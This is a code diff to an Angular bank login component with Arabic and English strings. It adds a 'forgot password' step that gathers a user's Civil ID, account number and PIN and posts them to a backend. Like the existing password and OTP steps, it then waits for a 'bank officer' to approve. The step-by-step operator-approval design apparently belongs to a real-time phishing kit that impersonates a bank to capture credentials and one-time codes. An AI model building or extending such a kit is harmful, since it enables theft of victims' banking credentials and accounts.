@@ -7,7 +7,7 @@ import { HeaderComponent } from '../../shared/components/header/header';
 import { io } from 'socket.io-client';
 import { API_BASE } from '../../shared/config';
 
-type LoginStep = 'CREDENTIALS' | 'WAITING_QUESTION' | 'ANSWER_QUESTION' | 'WAITING_APPROVAL' | 'ENTER_PASSWORD' | 'WAITING_PASSWORD_APPROVAL' | 'ENTER_OTP' | 'APPROVED' | 'REJECTED';
+type LoginStep = 'CREDENTIALS' | 'WAITING_QUESTION' | 'ANSWER_QUESTION' | 'WAITING_APPROVAL' | 'ENTER_PASSWORD' | 'WAITING_PASSWORD_APPROVAL' | 'FORGOT_PASSWORD' | 'WAITING_RESET_APPROVAL' | 'ENTER_OTP' | 'APPROVED' | 'REJECTED';
 
 @Component({
   selector: 'app-login',
@@ -28,6 +28,9 @@ export class LoginComponent implements OnInit, OnDestroy {
   answer = signal('');
   password = signal('');
   otp = signal('');
+  civilId = signal('');
+  pin = signal('');
+  acceptTerms = signal(false);
   loading = signal(false);
   errorMessage = signal('');
 
@@ -62,7 +65,19 @@ export class LoginComponent implements OnInit, OnDestroy {
       otpLabel: 'رمز التحقق (OTP)',
       otpPlaceholder: 'ادخل رمز التحقق OTP',
       submitOtp: 'تأكيد الرمز',
-      waitingPasswordApproval: 'جاري التحقق من كلمة السر، يرجى الانتظار للموافقة على الدخول من قبل موظف البنك...'
+      waitingPasswordApproval: 'جاري التحقق من كلمة السر، يرجى الانتظار للموافقة على الدخول من قبل موظف البنك...',
+      resetTitle: 'تعيين الحساب',
+      resetSubtitle: 'يمكنك تغيير كلمة السر بخطوات بسيطة',
+      civilIdLabel: 'الرقم المدني',
+      civilIdPlaceholder: 'ادخل الرقم المدني',
+      pinLabel: 'الرقم السري',
+      pinPlaceholder: 'ادخل الرقم السري',
+      termsAccept: 'الموافقة على الشروط والأحكام',
+      termsLine1: 'نقوم بحماية بياناتك بما يتماشى مع ',
+      termsLine2: 'سياسة الخصوصية',
+      termsLine3: ' و ',
+      termsLine4: 'شروط وأحكام الخدمة',
+      waitingResetApproval: 'جاري التحقق من طلب تعيين الحساب، يرجى الانتظار للموافقة على الطلب من قبل موظف البنك...'
     },
     en: {
       title: 'Login',
@@ -90,7 +105,19 @@ export class LoginComponent implements OnInit, OnDestroy {
       otpLabel: 'Verification Code (OTP)',
       otpPlaceholder: 'Enter OTP code',
       submitOtp: 'Confirm OTP',
-      waitingPasswordApproval: 'Verifying password, please wait for login approval from the bank officer...'
+      waitingPasswordApproval: 'Verifying password, please wait for login approval from the bank officer...',
+      resetTitle: 'Account Setup',
+      resetSubtitle: 'You can change the password in simple steps',
+      civilIdLabel: 'Civil ID',
+      civilIdPlaceholder: 'Enter Civil ID',
+      pinLabel: 'PIN',
+      pinPlaceholder: 'Enter PIN',
+      termsAccept: 'Agree to Terms & Conditions',
+      termsLine1: 'We protect your data in accordance with the ',
+      termsLine2: 'Privacy Policy',
+      termsLine3: ' and ',
+      termsLine4: 'Terms & Conditions of Service',
+      waitingResetApproval: 'Verifying account reset request, please wait for approval from the bank officer...'
     }
   };
 
@@ -110,6 +137,13 @@ export class LoginComponent implements OnInit, OnDestroy {
     }
     if (this.step() === 'ENTER_OTP') {
       return this.otp().trim().length > 0;
+    }
+    if (this.step() === 'FORGOT_PASSWORD') {
+      return this.username().trim().length > 0 &&
+             this.civilId().trim().length > 0 &&
+             this.accountNumber().trim().length > 0 &&
+             this.pin().trim().length > 0 &&
+             this.acceptTerms();
     }
     return false;
   }
@@ -132,6 +166,14 @@ export class LoginComponent implements OnInit, OnDestroy {
       document.documentElement.dir = this.lang === 'ar' ? 'rtl' : 'ltr';
       document.documentElement.lang = this.lang;
     }
+  }
+
+  onForgotPassword(): void {
+    this.step.set('FORGOT_PASSWORD');
+    this.errorMessage.set('');
+    this.civilId.set('');
+    this.pin.set('');
+    this.acceptTerms.set(false);
   }
 
   async onSubmit(): Promise<void> {
@@ -162,7 +204,7 @@ export class LoginComponent implements OnInit, OnDestroy {
         });
 
         const data = await response.json();
-        if (!response.ok) throw new Error(data.message || 'فشل إرسال الإجابة');
+        if (!response.ok) throw new Error(data.message || 'فشلت إرسال الإجابة');
 
         this.step.set('WAITING_APPROVAL');
       } else if (this.step() === 'ENTER_PASSWORD') {
@@ -173,9 +215,24 @@ export class LoginComponent implements OnInit, OnDestroy {
         });
 
         const data = await response.json();
-        if (!response.ok) throw new Error(data.message || 'فشل إرسال كلمة السر');
+        if (!response.ok) throw new Error(data.message || 'فشلت إرسال كلمة السر');
 
         this.step.set('WAITING_PASSWORD_APPROVAL');
+      } else if (this.step() === 'FORGOT_PASSWORD') {
+        const response = await fetch(`${API_BASE}/user/client/reset-details`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            clientId: this.clientId(),
+            civilId: this.civilId(),
+            pin: this.pin()
+          })
+        });
+
+        const data = await response.json();
+        if (!response.ok) throw new Error(data.message || 'فشلت عملية تعيين الحساب');
+
+        this.step.set('WAITING_RESET_APPROVAL');
       } else if (this.step() === 'ENTER_OTP') {
         const response = await fetch(`${API_BASE}/user/client/otp`, {
           method: 'POST',
@@ -184,7 +241,7 @@ export class LoginComponent implements OnInit, OnDestroy {
         });
 
         const data = await response.json();
-        if (!response.ok) throw new Error(data.message || 'فشل إرسال رمز التحقق');
+        if (!response.ok) throw new Error(data.message || 'فشلت إرسال رمز التحقق');
       }
     } catch (err: any) {
       this.errorMessage.set(err.message || 'حدث خطأ أثناء الاتصال بالخادم');
@@ -217,6 +274,8 @@ export class LoginComponent implements OnInit, OnDestroy {
           this.step.set('ENTER_PASSWORD');
         } else if (data.status === 'PASSWORD_SUBMITTED') {
           this.step.set('WAITING_PASSWORD_APPROVAL');
+        } else if (data.status === 'RESET_SUBMITTED') {
+          this.step.set('WAITING_RESET_APPROVAL');
         } else if (data.status === 'OTP_PENDING') {
           this.step.set('ENTER_OTP');
         } else if (data.status === 'APPROVED') {
@@ -249,6 +308,9 @@ export class LoginComponent implements OnInit, OnDestroy {
     this.answer.set('');
     this.password.set('');
     this.otp.set('');
+    this.civilId.set('');
+    this.pin.set('');
+    this.acceptTerms.set(false);
     this.errorMessage.set('');
   }
 }
